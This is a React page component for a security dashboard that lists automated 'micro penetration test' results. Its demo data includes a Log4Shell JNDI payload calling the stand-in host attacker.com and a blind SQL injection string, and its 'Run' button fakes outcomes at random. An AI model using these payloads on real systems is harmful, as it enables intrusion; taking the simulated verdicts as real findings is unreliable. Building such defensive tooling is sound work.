'use client'

import { useState, useEffect, useMemo } from 'react'
import { Crosshair, Search, Play, CheckCircle, Clock, XCircle, Filter, RefreshCw, AlertTriangle, Shield, Zap, Target, Activity, Loader2, WifiOff, X } from 'lucide-react'
import { AppShell, useDemoModeContext } from '@fixops/ui'
import { useFindings } from '@fixops/api-client'

interface MicroPentest {
  id: string
  name: string
  target: string
  cve_id: string
  status: 'pending' | 'running' | 'completed' | 'failed'
  result: 'exploitable' | 'not_exploitable' | 'inconclusive' | null
  confidence: number
  started_at: string | null
  completed_at: string | null
  duration_ms: number | null
  attack_vector: string
  payload_used: string | null
  evidence_collected: boolean
  risk_score: number
  remediation_priority: string
}

const DEMO_PENTESTS: MicroPentest[] = [
  {
    id: '1',
    name: 'Log4Shell Exploitation Test',
    target: 'payment-service:8080',
    cve_id: 'CVE-2021-44228',
    status: 'completed',
    result: 'exploitable',
    confidence: 0.95,
    started_at: '2024-12-20T09:00:00Z',
    completed_at: '2024-12-20T09:00:45Z',
    duration_ms: 45000,
    attack_vector: 'JNDI Injection via User-Agent header',
    payload_used: '${jndi:ldap://attacker.com/exploit}',
    evidence_collected: true,
    risk_score: 9.8,
    remediation_priority: 'critical'
  },
  {
    id: '2',
    name: 'OpenSSL Buffer Overflow',
    target: 'auth-service:443',
    cve_id: 'CVE-2024-5678',
    status: 'completed',
    result: 'not_exploitable',
    confidence: 0.88,
    started_at: '2024-12-20T09:15:00Z',
    completed_at: '2024-12-20T09:16:30Z',
    duration_ms: 90000,
    attack_vector: 'TLS handshake manipulation',
    payload_used: null,
    evidence_collected: true,
    risk_score: 3.2,
    remediation_priority: 'low'
  },
  {
    id: '3',
    name: 'Struts RCE Verification',
    target: 'web-frontend:80',
    cve_id: 'CVE-2023-50164',
    status: 'running',
    result: null,
    confidence: 0,
    started_at: '2024-12-20T10:00:00Z',
    completed_at: null,
    duration_ms: null,
    attack_vector: 'File upload path traversal',
    payload_used: null,
    evidence_collected: false,
    risk_score: 0,
    remediation_priority: 'pending'
  },
  {
    id: '4',
    name: 'SQL Injection Test',
    target: 'api-gateway:8443',
    cve_id: 'CVE-2024-1234',
    status: 'completed',
    result: 'exploitable',
    confidence: 0.92,
    started_at: '2024-12-20T08:30:00Z',
    completed_at: '2024-12-20T08:31:15Z',
    duration_ms: 75000,
    attack_vector: 'Time-based blind SQL injection',
    payload_used: "' OR SLEEP(5)--",
    evidence_collected: true,
    risk_score: 8.5,
    remediation_priority: 'high'
  },
  {
    id: '5',
    name: 'XSS Payload Injection',
    target: 'user-portal:3000',
    cve_id: 'CVE-2024-9999',
    status: 'pending',
    result: null,
    confidence: 0,
    started_at: null,
    completed_at: null,
    duration_ms: null,
    attack_vector: 'Reflected XSS via search parameter',
    payload_used: null,
    evidence_collected: false,
    risk_score: 0,
    remediation_priority: 'pending'
  }
]

export default function MicroPentestPage() {
  const { demoEnabled } = useDemoModeContext()
  const { data: apiData, loading: apiLoading, error: apiError, refetch } = useFindings()
  
  // Transform API data to match our UI format, or use demo data
  const pentestsData = useMemo(() => {
    if (demoEnabled || !apiData?.items) {
      return DEMO_PENTESTS
    }
    // Filter for pentest-related findings
    const pentestFindings = apiData.items.filter(f => 
      f.source === 'pentest' || f.source === 'micro-pentest'
    )
    return pentestFindings.map(finding => ({
      id: finding.id,
      name: finding.title,
      target: finding.target || 'unknown:8080',
      cve_id: finding.cve_id || 'CVE-XXXX-XXXX',
      status: 'completed' as const,
      result: finding.severity === 'critical' || finding.severity === 'high' ? 'exploitable' as const : 'not_exploitable' as const,
      confidence: 0.85,
      started_at: finding.created_at,
      completed_at: finding.updated_at || finding.created_at,
      duration_ms: 45000,
      attack_vector: finding.description || 'Automated vulnerability verification',
      payload_used: null,
      evidence_collected: true,
      risk_score: finding.severity === 'critical' ? 9.5 : finding.severity === 'high' ? 7.5 : 4.0,
      remediation_priority: finding.severity || 'medium'
    }))
  }, [demoEnabled, apiData])

  const [pentests, setPentests] = useState<MicroPentest[]>(DEMO_PENTESTS)
  const [filteredPentests, setFilteredPentests] = useState<MicroPentest[]>(DEMO_PENTESTS)
  const [selectedPentest, setSelectedPentest] = useState<MicroPentest | null>(null)
  const [searchQuery, setSearchQuery] = useState('')
    const [statusFilter, setStatusFilter] = useState<string>('all')
    const [resultFilter, setResultFilter] = useState<string>('all')
    const [showMobileFilters, setShowMobileFilters] = useState(false)
  const [showCreateModal, setShowCreateModal] = useState(false)
  const [newTestTarget, setNewTestTarget] = useState('')
  const [newTestCve, setNewTestCve] = useState('')

  // Update pentests when data source changes
  useEffect(() => {
    setPentests(pentestsData)
    setFilteredPentests(pentestsData)
  }, [pentestsData])

  useEffect(() => {
    applyFilters()
  }, [searchQuery, statusFilter, resultFilter, pentests])

  const applyFilters = () => {
    let filtered = [...pentests]

    if (searchQuery) {
      const query = searchQuery.toLowerCase()
      filtered = filtered.filter(p =>
        p.name.toLowerCase().includes(query) ||
        p.target.toLowerCase().includes(query) ||
        p.cve_id.toLowerCase().includes(query)
      )
    }

    if (statusFilter !== 'all') {
      filtered = filtered.filter(p => p.status === statusFilter)
    }

    if (resultFilter !== 'all') {
      filtered = filtered.filter(p => p.result === resultFilter)
    }

    setFilteredPentests(filtered)
  }

  const getStatusColor = (status: string) => {
    const colors = {
      pending: '#eab308',
      running: '#3b82f6',
      completed: '#10b981',
      failed: '#dc2626',
    }
    return colors[status as keyof typeof colors] || colors.pending
  }

  const getStatusIcon = (status: string) => {
    const icons = {
      pending: <Clock size={14} />,
      running: <RefreshCw size={14} className="animate-spin" />,
      completed: <CheckCircle size={14} />,
      failed: <XCircle size={14} />,
    }
    return icons[status as keyof typeof icons] || icons.pending
  }

  const getResultColor = (result: string | null) => {
    if (!result) return '#6b7280'
    const colors = {
      exploitable: '#dc2626',
      not_exploitable: '#10b981',
      inconclusive: '#eab308',
    }
    return colors[result as keyof typeof colors] || colors.inconclusive
  }

  const formatDate = (isoString: string | null) => {
    if (!isoString) return 'N/A'
    const date = new Date(isoString)
    return date.toLocaleDateString('en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' })
  }

  const formatDuration = (ms: number | null) => {
    if (!ms) return 'N/A'
    if (ms < 1000) return `${ms}ms`
    if (ms < 60000) return `${(ms / 1000).toFixed(1)}s`
    return `${(ms / 60000).toFixed(1)}m`
  }

  const handleCreateTest = () => {
    if (!newTestTarget.trim() || !newTestCve.trim()) return

    const newPentest: MicroPentest = {
      id: String(pentests.length + 1),
      name: `Micro Pentest - ${newTestCve}`,
      target: newTestTarget,
      cve_id: newTestCve.toUpperCase(),
      status: 'pending',
      result: null,
      confidence: 0,
      started_at: null,
      completed_at: null,
      duration_ms: null,
      attack_vector: 'Automated vulnerability verification',
      payload_used: null,
      evidence_collected: false,
      risk_score: 0,
      remediation_priority: 'pending'
    }

    setPentests([newPentest, ...pentests])
    setNewTestTarget('')
    setNewTestCve('')
    setShowCreateModal(false)
  }

  const handleRunTest = (pentest: MicroPentest) => {
    setPentests(pentests.map(p => 
      p.id === pentest.id 
        ? { ...p, status: 'running' as const, started_at: new Date().toISOString() }
        : p
    ))

    // Simulate test completion after 3 seconds
    setTimeout(() => {
      const isExploitable = Math.random() > 0.4
      setPentests(prev => prev.map(p => 
        p.id === pentest.id 
          ? { 
              ...p, 
              status: 'completed' as const,
              result: isExploitable ? 'exploitable' as const : 'not_exploitable' as const,
              confidence: Math.random() * 0.3 + 0.7,
              completed_at: new Date().toISOString(),
              duration_ms: Math.floor(Math.random() * 60000) + 30000,
              evidence_collected: true,
              risk_score: isExploitable ? Math.random() * 3 + 7 : Math.random() * 4,
              remediation_priority: isExploitable ? 'critical' : 'low'
            }
          : p
      ))
    }, 3000)
  }

  const summary = {
    total: pentests.length,
    running: pentests.filter(p => p.status === 'running').length,
    completed: pentests.filter(p => p.status === 'completed').length,
    exploitable: pentests.filter(p => p.result === 'exploitable').length,
    not_exploitable: pentests.filter(p => p.result === 'not_exploitable').length,
  }

  return (
    <AppShell activeApp="micro-pentest">
            <div className="flex min-h-screen bg-[#0f172a] font-sans text-white">
              {/* Mobile Filter Overlay */}
              {showMobileFilters && (
                <div className="fixed inset-0 z-50 lg:hidden">
                  <div className="absolute inset-0 bg-black/60" onClick={() => setShowMobileFilters(false)} />
                  <div className="absolute left-0 top-0 h-full w-72 bg-[#0f172a] border-r border-white/10 flex flex-col overflow-auto">
                    <div className="p-4 border-b border-white/10 flex items-center justify-between">
                      <span className="font-semibold">Filters</span>
                      <button onClick={() => setShowMobileFilters(false)} className="p-2 hover:bg-white/10 rounded-md">
                        <X size={18} />
                      </button>
                    </div>
                    <div className="p-4 border-b border-white/10">
                      <div className="grid grid-cols-2 gap-3 text-xs">
                        <div className="p-3 bg-white/5 rounded-md">
                          <div className="text-slate-500 mb-1">Total</div>
                          <div className="text-xl font-semibold text-[#6B5AED]">{summary.total}</div>
                        </div>
                        <div className="p-3 bg-white/5 rounded-md">
                          <div className="text-slate-500 mb-1">Exploitable</div>
                          <div className="text-xl font-semibold text-red-500">{summary.exploitable}</div>
                        </div>
                      </div>
                    </div>
                    <div className="p-4 flex-1 overflow-auto">
                      <div className="mb-6">
                        <div className="text-[11px] font-semibold text-slate-500 uppercase tracking-wider mb-3">Status</div>
                        <div className="space-y-2">
                          {['all', 'pending', 'running', 'completed', 'failed'].map((status) => (
                            <button
                              key={status}
                              onClick={() => { setStatusFilter(status); setShowMobileFilters(false); }}
                              className={`w-full p-2.5 rounded-md text-sm font-medium text-left transition-all ${statusFilter === status ? 'bg-[#6B5AED]/10 text-[#6B5AED] border border-[#6B5AED]/30' : 'text-slate-400 hover:bg-white/5'}`}
                            >
                              <span className="capitalize">{status}</span>
                            </button>
                          ))}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* Desktop Sidebar - Filters */}
              <div className="hidden lg:flex w-72 bg-[#0f172a]/80 border-r border-white/10 flex-col sticky top-0 h-screen">
                {/* Header */}
                <div className="p-6 border-b border-white/10">
                  <div className="flex items-center gap-3 mb-4">
                    <Crosshair size={24} className="text-[#6B5AED]" />
                    <h2 className="text-lg font-semibold">Micro Pen Tests</h2>
                  </div>
                  <p className="text-xs text-slate-500">Automated vulnerability verification</p>
                </div>

          {/* Summary Stats */}
          <div className="p-4 border-b border-white/10">
            <div className="grid grid-cols-2 gap-3 text-xs">
              <div className="p-3 bg-white/5 rounded-md">
                <div className="text-slate-500 mb-1">Total Tests</div>
                <div className="text-xl font-semibold text-[#6B5AED]">{summary.total}</div>
              </div>
              <div className="p-3 bg-white/5 rounded-md">
                <div className="text-slate-500 mb-1">Running</div>
                <div className="text-xl font-semibold text-blue-500">{summary.running}</div>
              </div>
              <div className="p-3 bg-white/5 rounded-md">
                <div className="text-slate-500 mb-1">Exploitable</div>
                <div className="text-xl font-semibold text-red-500">{summary.exploitable}</div>
              </div>
              <div className="p-3 bg-white/5 rounded-md">
                <div className="text-slate-500 mb-1">Safe</div>
                <div className="text-xl font-semibold text-green-500">{summary.not_exploitable}</div>
              </div>
            </div>
          </div>

          {/* Filters */}
          <div className="p-4 flex-1 overflow-auto">
            <div className="mb-6">
              <div className="text-[11px] font-semibold text-slate-500 uppercase tracking-wider mb-3 flex items-center gap-2">
                <Filter size={12} />
                Status
              </div>
              <div className="space-y-2">
                {['all', 'pending', 'running', 'completed', 'failed'].map((status) => (
                  <button
                    key={status}
                    onClick={() => setStatusFilter(status)}
                    className={`w-full p-2.5 rounded-md text-sm font-medium text-left transition-all ${
                      statusFilter === status
                        ? 'bg-[#6B5AED]/10 text-[#6B5AED] border border-[#6B5AED]/30'
                        : 'text-slate-400 hover:bg-white/5'
                    }`}
                  >
                    <span className="capitalize">{status}</span>
                  </button>
                ))}
              </div>
            </div>

            <div>
              <div className="text-[11px] font-semibold text-slate-500 uppercase tracking-wider mb-3 flex items-center gap-2">
                <Filter size={12} />
                Result
              </div>
              <div className="space-y-2">
                {['all', 'exploitable', 'not_exploitable', 'inconclusive'].map((result) => (
                  <button
                    key={result}
                    onClick={() => setResultFilter(result)}
                    className={`w-full p-2.5 rounded-md text-sm font-medium text-left transition-all ${
                      resultFilter === result
                        ? 'bg-[#6B5AED]/10 text-[#6B5AED] border border-[#6B5AED]/30'
                        : 'text-slate-400 hover:bg-white/5'
                    }`}
                  >
                    <span className="capitalize">{result.replace('_', ' ')}</span>
                  </button>
                ))}
              </div>
            </div>
          </div>
        </div>

                {/* Main Content */}
                <div className="flex-1 flex flex-col min-w-0">
                  {/* Top Bar */}
                  <div className="p-4 lg:p-5 border-b border-white/10 bg-[#0f172a]/80 backdrop-blur-sm">
                    <div className="flex items-center justify-between mb-4">
                      <div className="flex items-center gap-3">
                        {/* Mobile Filter Toggle */}
                        <button
                          onClick={() => setShowMobileFilters(true)}
                          className="lg:hidden p-2 bg-white/5 border border-white/10 rounded-md hover:bg-white/10 transition-colors"
                        >
                          <Filter size={18} />
                        </button>
                        <div>
                          <h1 className="text-xl lg:text-2xl font-semibold mb-1">Micro Penetration Tests</h1>
                          <p className="text-sm text-slate-500">
                            Showing {filteredPentests.length} test{filteredPentests.length !== 1 ? 's' : ''}
                          </p>
                        </div>
                      </div>
                      <button
                        onClick={() => setShowCreateModal(true)}
                        className="px-4 py-2 bg-[#6B5AED] hover:bg-[#5B4ADD] rounded-md text-white text-sm font-medium transition-all flex items-center gap-2"
                      >
                        <Zap size={16} />
                        <span className="hidden sm:inline">New Test</span>
                      </button>
                    </div>

            {/* Search Bar */}
            <div className="relative">
              <Search size={16} className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400" />
              <input
                type="text"
                placeholder="Search by name, target, or CVE..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full pl-10 pr-4 py-2 bg-white/5 border border-white/10 rounded-md text-sm text-white placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-[#6B5AED]/50"
              />
            </div>
          </div>

          {/* Tests Grid */}
          <div className="flex-1 overflow-auto p-6">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
              {filteredPentests.map((pentest) => (
                <div
                  key={pentest.id}
                  onClick={() => setSelectedPentest(pentest)}
                  className="bg-white/2 border border-white/5 rounded-lg p-5 hover:bg-white/5 hover:border-[#6B5AED]/30 cursor-pointer transition-all"
                >
                  {/* Header */}
                  <div className="flex items-start justify-between mb-3">
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 rounded-lg bg-[#6B5AED]/20 flex items-center justify-center">
                        <Crosshair size={20} className="text-[#6B5AED]" />
                      </div>
                      <div>
                        <h3 className="text-sm font-semibold text-white">{pentest.name}</h3>
                        <p className="text-xs text-slate-400">{pentest.cve_id}</p>
                      </div>
                    </div>
                    <span
                      className="inline-flex items-center gap-1 px-2 py-1 rounded text-xs font-medium"
                      style={{ 
                        backgroundColor: `${getStatusColor(pentest.status)}20`,
                        color: getStatusColor(pentest.status)
                      }}
                    >
                      {getStatusIcon(pentest.status)}
                      {pentest.status}
                    </span>
                  </div>

                  {/* Target */}
                  <div className="mb-4 p-3 bg-white/5 rounded-lg">
                    <div className="text-xs text-slate-400 mb-1">Target</div>
                    <div className="text-sm text-white font-mono">{pentest.target}</div>
                  </div>

                  {/* Result */}
                  {pentest.result && (
                    <div className="mb-4">
                      <span
                        className="inline-flex items-center gap-1 px-3 py-1.5 rounded text-sm font-medium"
                        style={{ 
                          backgroundColor: `${getResultColor(pentest.result)}20`,
                          color: getResultColor(pentest.result)
                        }}
                      >
                        {pentest.result === 'exploitable' ? <AlertTriangle size={14} /> : <Shield size={14} />}
                        {pentest.result.replace('_', ' ').toUpperCase()}
                      </span>
                    </div>
                  )}

                  {/* Stats */}
                  <div className="grid grid-cols-3 gap-3 mb-4">
                    <div className="p-2 bg-white/5 rounded-lg text-center">
                      <div className="text-xs text-slate-400 mb-1">Confidence</div>
                      <div className="text-sm font-semibold text-blue-500">
                        {pentest.confidence > 0 ? `${Math.round(pentest.confidence * 100)}%` : '-'}
                      </div>
                    </div>
                    <div className="p-2 bg-white/5 rounded-lg text-center">
                      <div className="text-xs text-slate-400 mb-1">Duration</div>
                      <div className="text-sm font-semibold text-slate-300">
                        {formatDuration(pentest.duration_ms)}
                      </div>
                    </div>
                    <div className="p-2 bg-white/5 rounded-lg text-center">
                      <div className="text-xs text-slate-400 mb-1">Risk Score</div>
                      <div className={`text-sm font-semibold ${pentest.risk_score >= 7 ? 'text-red-500' : pentest.risk_score >= 4 ? 'text-orange-500' : 'text-green-500'}`}>
                        {pentest.risk_score > 0 ? pentest.risk_score.toFixed(1) : '-'}
                      </div>
                    </div>
                  </div>

                  {/* Footer */}
                  <div className="flex items-center justify-between pt-3 border-t border-white/5">
                    <div className="flex items-center gap-2 text-xs text-slate-400">
                      <Clock size={12} />
                      {formatDate(pentest.started_at || pentest.completed_at)}
                    </div>
                    {pentest.status === 'pending' && (
                      <button
                        onClick={(e) => {
                          e.stopPropagation()
                          handleRunTest(pentest)
                        }}
                        className="px-3 py-1 bg-[#6B5AED]/20 hover:bg-[#6B5AED]/30 rounded text-xs text-[#6B5AED] font-medium transition-all flex items-center gap-1"
                      >
                        <Play size={12} />
                        Run
                      </button>
                    )}
                    {pentest.evidence_collected && (
                      <span className="text-xs text-green-500 flex items-center gap-1">
                        <CheckCircle size={12} />
                        Evidence
                      </span>
                    )}
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Detail Drawer */}
        {selectedPentest && (
          <div
            onClick={() => setSelectedPentest(null)}
            className="fixed inset-0 bg-black/70 backdrop-blur-sm z-50 flex justify-end"
          >
            <div
              onClick={(e) => e.stopPropagation()}
              className="w-[600px] h-full bg-[#1e293b] border-l border-white/10 flex flex-col animate-slide-in overflow-auto"
            >
              {/* Drawer Header */}
              <div className="p-6 border-b border-white/10 sticky top-0 bg-[#1e293b] z-10">
                <div className="flex justify-between items-start mb-4">
                  <div>
                    <h3 className="text-lg font-semibold mb-1">{selectedPentest.name}</h3>
                    <p className="text-sm text-slate-400">{selectedPentest.cve_id}</p>
                  </div>
                  <button
                    onClick={() => setSelectedPentest(null)}
                    className="text-slate-400 hover:text-white transition-colors"
                  >
                    X
                  </button>
                </div>

                <div className="flex gap-2 flex-wrap">
                  <span
                    className="inline-flex items-center gap-1 px-3 py-1.5 rounded text-sm font-medium"
                    style={{ 
                      backgroundColor: `${getStatusColor(selectedPentest.status)}20`,
                      color: getStatusColor(selectedPentest.status)
                    }}
                  >
                    {getStatusIcon(selectedPentest.status)}
                    {selectedPentest.status}
                  </span>
                  {selectedPentest.result && (
                    <span
                      className="inline-flex items-center gap-1 px-3 py-1.5 rounded text-sm font-medium"
                      style={{ 
                        backgroundColor: `${getResultColor(selectedPentest.result)}20`,
                        color: getResultColor(selectedPentest.result)
                      }}
                    >
                      {selectedPentest.result === 'exploitable' ? <AlertTriangle size={14} /> : <Shield size={14} />}
                      {selectedPentest.result.replace('_', ' ')}
                    </span>
                  )}
                  {selectedPentest.evidence_collected && (
                    <span className="inline-flex items-center gap-1 px-3 py-1.5 rounded text-sm font-medium bg-green-500/20 text-green-500">
                      <CheckCircle size={14} />
                      Evidence Collected
                    </span>
                  )}
                </div>
              </div>

              {/* Drawer Content */}
              <div className="flex-1 p-6 space-y-6">
                {/* Target Information */}
                <div>
                  <h4 className="text-sm font-semibold text-slate-300 mb-3">Target Information</h4>
                  <div className="bg-white/5 rounded-lg p-4 space-y-3">
                    <div className="flex justify-between">
                      <span className="text-sm text-slate-400">Target</span>
                      <span className="text-sm text-white font-mono">{selectedPentest.target}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-sm text-slate-400">CVE</span>
                      <span className="text-sm text-white">{selectedPentest.cve_id}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-sm text-slate-400">Attack Vector</span>
                      <span className="text-sm text-white">{selectedPentest.attack_vector}</span>
                    </div>
                  </div>
                </div>

                {/* Payload */}
                {selectedPentest.payload_used && (
                  <div>
                    <h4 className="text-sm font-semibold text-slate-300 mb-3">Payload Used</h4>
                    <div className="bg-black/30 rounded-lg p-4 font-mono text-sm text-red-400 overflow-x-auto">
                      <code>{selectedPentest.payload_used}</code>
                    </div>
                  </div>
                )}

                {/* Risk Assessment */}
                {selectedPentest.risk_score > 0 && (
                  <div>
                    <h4 className="text-sm font-semibold text-slate-300 mb-3">Risk Assessment</h4>
                    <div className="grid grid-cols-2 gap-4">
                      <div className="bg-white/5 rounded-lg p-4">
                        <div className="text-xs text-slate-400 mb-1">Risk Score</div>
                        <div className={`text-3xl font-semibold ${selectedPentest.risk_score >= 7 ? 'text-red-500' : selectedPentest.risk_score >= 4 ? 'text-orange-500' : 'text-green-500'}`}>
                          {selectedPentest.risk_score.toFixed(1)}
                        </div>
                        <div className="text-xs text-slate-500 mt-1">out of 10</div>
                      </div>
                      <div className="bg-white/5 rounded-lg p-4">
                        <div className="text-xs text-slate-400 mb-1">Remediation Priority</div>
                        <div className={`text-xl font-semibold capitalize ${
                          selectedPentest.remediation_priority === 'critical' ? 'text-red-500' :
                          selectedPentest.remediation_priority === 'high' ? 'text-orange-500' :
                          selectedPentest.remediation_priority === 'medium' ? 'text-yellow-500' :
                          'text-green-500'
                        }`}>
                          {selectedPentest.remediation_priority}
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                {/* Confidence */}
                {selectedPentest.confidence > 0 && (
                  <div>
                    <h4 className="text-sm font-semibold text-slate-300 mb-3">Test Confidence</h4>
                    <div className="bg-white/5 rounded-lg p-4">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-sm text-slate-400">Confidence Score</span>
                        <span className="text-lg font-semibold text-[#6B5AED]">{Math.round(selectedPentest.confidence * 100)}%</span>
                      </div>
                      <div className="h-3 bg-white/10 rounded-full overflow-hidden">
                        <div 
                          className="h-full bg-[#6B5AED] rounded-full"
                          style={{ width: `${selectedPentest.confidence * 100}%` }}
                        />
                      </div>
                    </div>
                  </div>
                )}

                {/* Timing */}
                <div>
                  <h4 className="text-sm font-semibold text-slate-300 mb-3">Timing</h4>
                  <div className="bg-white/5 rounded-lg p-4 space-y-3">
                    <div className="flex justify-between">
                      <span className="text-sm text-slate-400">Started</span>
                      <span className="text-sm text-white">{formatDate(selectedPentest.started_at)}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-sm text-slate-400">Completed</span>
                      <span className="text-sm text-white">{formatDate(selectedPentest.completed_at)}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-sm text-slate-400">Duration</span>
                      <span className="text-sm text-white">{formatDuration(selectedPentest.duration_ms)}</span>
                    </div>
                  </div>
                </div>

                {/* CLI Command */}
                <div>
                  <h4 className="text-sm font-semibold text-slate-300 mb-3">CLI Command</h4>
                  <div className="bg-black/30 rounded-lg p-4 font-mono text-sm">
                    <code className="text-green-400">python -m core.cli advanced-pentest run --target {selectedPentest.target} --cve {selectedPentest.cve_id}</code>
                  </div>
                </div>

                {/* Actions */}
                <div className="flex gap-3">
                  {selectedPentest.status === 'pending' && (
                    <button 
                      onClick={() => handleRunTest(selectedPentest)}
                      className="flex-1 px-4 py-2 bg-[#6B5AED] hover:bg-[#5B4ADD] rounded-md text-white text-sm font-medium transition-all flex items-center justify-center gap-2"
                    >
                      <Play size={16} />
                      Run Test
                    </button>
                  )}
                  {selectedPentest.evidence_collected && (
                    <button className="flex-1 px-4 py-2 bg-white/5 hover:bg-white/10 border border-white/10 rounded-md text-white text-sm font-medium transition-all flex items-center justify-center gap-2">
                      <Activity size={16} />
                      View Evidence
                    </button>
                  )}
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Create Modal */}
        {showCreateModal && (
          <div
            onClick={() => setShowCreateModal(false)}
            className="fixed inset-0 bg-black/70 backdrop-blur-sm z-50 flex items-center justify-center"
          >
            <div
              onClick={(e) => e.stopPropagation()}
              className="w-[500px] bg-[#1e293b] border border-white/10 rounded-lg shadow-xl"
            >
              <div className="p-6 border-b border-white/10">
                <h3 className="text-lg font-semibold">New Micro Pen Test</h3>
                <p className="text-sm text-slate-400 mt-1">Create a new automated vulnerability verification test</p>
              </div>
              <div className="p-6 space-y-4">
                <div>
                  <label className="block text-sm font-medium text-slate-300 mb-2">Target</label>
                  <input
                    type="text"
                    placeholder="e.g., payment-service:8080"
                    value={newTestTarget}
                    onChange={(e) => setNewTestTarget(e.target.value)}
                    className="w-full px-3 py-2 bg-white/5 border border-white/10 rounded-md text-sm text-white placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-[#6B5AED]/50"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-slate-300 mb-2">CVE ID</label>
                  <input
                    type="text"
                    placeholder="e.g., CVE-2024-1234"
                    value={newTestCve}
                    onChange={(e) => setNewTestCve(e.target.value)}
                    className="w-full px-3 py-2 bg-white/5 border border-white/10 rounded-md text-sm text-white placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-[#6B5AED]/50"
                  />
                </div>
              </div>
              <div className="p-6 border-t border-white/10 flex justify-end gap-3">
                <button
                  onClick={() => setShowCreateModal(false)}
                  className="px-4 py-2 bg-white/5 hover:bg-white/10 border border-white/10 rounded-md text-white text-sm font-medium transition-all"
                >
                  Cancel
                </button>
                <button
                  onClick={handleCreateTest}
                  disabled={!newTestTarget.trim() || !newTestCve.trim()}
                  className="px-4 py-2 bg-[#6B5AED] hover:bg-[#5B4ADD] disabled:opacity-50 rounded-md text-white text-sm font-medium transition-all flex items-center gap-2"
                >
                  <Zap size={16} />
                  Create Test
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    </AppShell>
  )
}
